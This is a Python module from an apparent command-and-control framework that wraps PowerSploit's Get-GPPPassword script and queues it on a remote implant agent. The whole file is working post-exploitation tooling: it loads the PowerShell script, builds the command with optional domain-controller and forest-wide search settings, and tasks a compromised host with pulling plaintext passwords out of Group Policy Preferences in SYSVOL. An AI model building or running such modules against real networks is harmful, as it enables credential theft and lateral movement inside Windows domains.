import os
import importlib.util
import base64
import re


def get_info():
    """Get module information"""
    return {
        "name": "Get-GPPPassword",
        "description": "Retrieve plaintext passwords from Group Policy Preferences using PowerShell",
        "type": "enumeration",
        "platform": "windows",
        "author": "PowerSploit/NeoC2 Framework",
        "references": [
            "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1",
            "https://adsecurity.org/?p=2288"
        ],
        "technique_id": "T1552.006,T1059.001",
        "mitre_tactics": ["Credential Access"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the GPP password retrieval on",
                "required": True
            },
            "server": {
                "description": "Specify the domain controller to search for (default: current domain)",
                "required": False,
                "default": ""
            },
            "search_forest": {
                "description": "Search all reachable trusts and SYSVOLs (true/false)",
                "required": False,
                "default": "false"
            },

        }
    }


def execute(options, session):
    """Execute the Get-GPPPassword module with given options and session"""
    agent_id = options.get("agent_id")
    server = options.get("server", "")
    search_forest = options.get("search_forest", "false")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if search_forest.lower() not in ["true", "false"]:
        return {
            "success": False,
            "error": f"Invalid search_forest value: {search_forest}. Must be 'true' or 'false'"
        }
    
    if server and not re.match(r'^[a-zA-Z0-9._-]+$', server):
        return {
            "success": False,
            "error": f"Invalid server value: {server}. Contains invalid characters."
        }

    session.current_agent = agent_id



    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Get-GPPPassword.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find Get-GPPPassword script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading Get-GPPPassword script: {str(e)}"
        }

    if server and search_forest.lower() == "true":
        execution_command = f"{original_script}\nGet-GPPPassword -Server \"{server}\" -SearchForest"
    elif server:
        execution_command = f"{original_script}\nGet-GPPPassword -Server \"{server}\""
    elif search_forest.lower() == "true":
        execution_command = f"{original_script}\nGet-GPPPassword -SearchForest"
    else:
        execution_command = f"{original_script}\nGet-GPPPassword"

    powershell_command = execution_command

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Get-GPPPassword task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "server": server if server else "current domain",
                "search_forest": search_forest
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }